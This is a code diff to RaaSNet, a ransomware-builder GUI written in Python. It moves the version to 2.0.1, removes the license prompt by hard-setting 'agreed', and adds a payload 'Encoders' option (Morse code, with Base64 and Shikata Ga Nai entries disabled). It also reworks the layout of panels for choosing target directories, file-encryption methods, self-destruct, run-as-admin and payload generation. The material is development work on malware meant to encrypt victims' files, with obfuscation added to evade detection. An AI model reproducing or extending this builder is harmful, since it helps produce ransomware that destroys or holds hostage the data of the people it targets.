@@ -37,11 +37,11 @@ but can easily be coded into it as a nice feature.
 
 # Headers
 __author__ = "Leon Voerman"
-__copyright__ = "Copyright 2019-2020, Incoming Security"
+__copyright__ = "Copyright 2019-2021, Incoming Security"
 __license__ = "GPLv3"
-__version__ = "1.2.9"
+__version__ = "2.0.1"
 __maintainer__ = "Leon Voerman"
-__email__ = "raasnet@protonmail.com"
+__email__ = "None"
 __status__ = "Production"
 
 import os, sys, subprocess, threading, time, datetime, socket, select, webbrowser, base64, platform, base64, requests, hashlib
@@ -429,6 +429,7 @@ class MainWindow(Tk):
             'new_working_dir' : StringVar(),
             'remove_payload' : IntVar(),
             'runas' : IntVar(),
+            'encoding' : StringVar(),
 
             'username' : StringVar(),
             'password' : StringVar(),
@@ -442,7 +443,7 @@ class MainWindow(Tk):
         }
 
 
-        #<activate>
+        self.options['agreed'].set(1)
 
         if not self.options['agreed'].get() == 1:
             self.show_license()
@@ -471,6 +472,7 @@ class MainWindow(Tk):
         self.options['remove_payload'].set(0)
         self.options['runas'].set(0)
         self.options['working_dir'].set('$HOME')
+        self.options['encoding'].set('morse')
 
         self.options['target_dirs'].set('''Downloads
 Documents
@@ -1064,13 +1066,13 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         Entry(server_frame, textvariable = self.options['port'], width = 20).grid(row = 1, column = 1)
 
         content_frame = LabelFrame(self.gen, text = 'Content')
-        content_frame.grid(row = 1, column = 0, sticky = 'nw')
+        content_frame.grid(row = 1, column = 0, columnspan = 2, sticky = 'nw')
         set_msg = HoverButton(content_frame, text = 'CUSTOM MESSAGE', command = self.set_msg, width = 25).grid(row = 0, column = 0)
         set_img = HoverButton(content_frame, text = 'CUSTOM IMAGE', command = self.set_img, width = 25).grid(row = 1, column = 0)
         set_ext = HoverButton(content_frame, text = 'CUSTOM FILE EXTENTIONS', command = self.set_ext, width = 25).grid(row = 2, column = 0)
 
         target_frame = LabelFrame(self.gen, text = 'Filesystem')
-        target_frame.grid(row = 1, column = 1, sticky = 'nw')
+        target_frame.grid(row = 1, column = 2, columnspan = 4, sticky = 'nw')
         set_dirs = HoverButton(target_frame, text = 'SET TARGET DIRS', command = self.set_dirs, width = 25).grid(row = 0, column = 0)
 
         enc_frame = LabelFrame(self.gen, text = 'Encryption Type')
@@ -1080,20 +1082,27 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         Radiobutton(enc_frame, text = 'PyCrypto (Fast)', variable = self.options['type'], value = 'pycrypto').grid(row = 2, column = 0, sticky = 'w')
         Radiobutton(enc_frame, text = 'PyAES (Slow)', variable = self.options['type'], value = 'pyaes').grid(row = 3, column = 0, sticky = 'w')
 
+        coders = LabelFrame(self.gen, text = 'Encoders')
+        coders.grid(row = 0, column = 3, sticky = 'nw')
+        Radiobutton(coders, text = 'Base64 (Basic)', variable = self.options['encoding'], value = 'base', state = DISABLED).grid(row = 0, column = 0, sticky = 'w')
+        Radiobutton(coders, text = 'Morse Code (Custom)', variable = self.options['encoding'], value = 'morse').grid(row = 1, column = 0, sticky = 'w')
+        Radiobutton(coders, text = 'Shikata Ga Nai (Poly)', variable = self.options['encoding'], value = 'shikata', state = DISABLED).grid(row = 2, column = 0, sticky = 'w')
+
         options_frame = LabelFrame(self.gen, text = 'Options')
-        options_frame.grid(row = 1, column = 2, sticky = 'nw')
+        options_frame.grid(row = 0, column = 4, sticky = 'nw')
         Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0, sticky = 'w')
         Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0, sticky = 'w')
         Checkbutton(options_frame, text = 'Self-destruct', variable = self.options['remove_payload'], onvalue = 1, offvalue = 0).grid(row = 2, column = 0, sticky = 'w')
         Checkbutton(options_frame, text = 'Run as admin (Windows)', variable = self.options['runas'], onvalue = 1, offvalue = 0).grid(row = 3, column = 0, sticky = 'w')
 
+
         meth_frame = LabelFrame(self.gen, text = 'Encryption Method')
-        meth_frame.grid(row = 2, column = 2, sticky = 'nw')
+        meth_frame.grid(row = 0, column = 5, sticky = 'nw')
         Radiobutton(meth_frame, text = 'Override and Rename', variable = self.options['method'], value = 'override').grid(row = 0, column = 0, sticky = 'w')
         Radiobutton(meth_frame, text = 'Copy and Remove', variable = self.options['method'], value = 'copy').grid(row = 1, column = 0, sticky = 'w')
 
         finish_frame = LabelFrame(self.gen, text = 'Finish')
-        finish_frame.grid(row = 2, column = 0, columnspan = 2, sticky = 'w')
+        finish_frame.grid(row = 2, column = 0, columnspan = 5, sticky = 'w')
         generate = HoverButton(finish_frame, text = "GENERATE", command = self.make_demon, width = 25, height = 2).grid(row = 0, column = 0)
         exit = HoverButton(finish_frame, text = 'Cancel', command = self.gen.destroy, width = 25).grid(row = 1, column = 0)
 
@@ -1196,7 +1205,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 self.options['target_dirs'].get(),
                 self.options['remove_payload'].get(),
                 self.options['working_dir'].get(),
-                self.options['runas'].get())
+                self.options['runas'].get(),
+                self.options['encoding'].get())
         except Exception as e:
             messagebox.showwarning('ERROR', 'Failed to generate payload!\n\n%s' % e)
             return
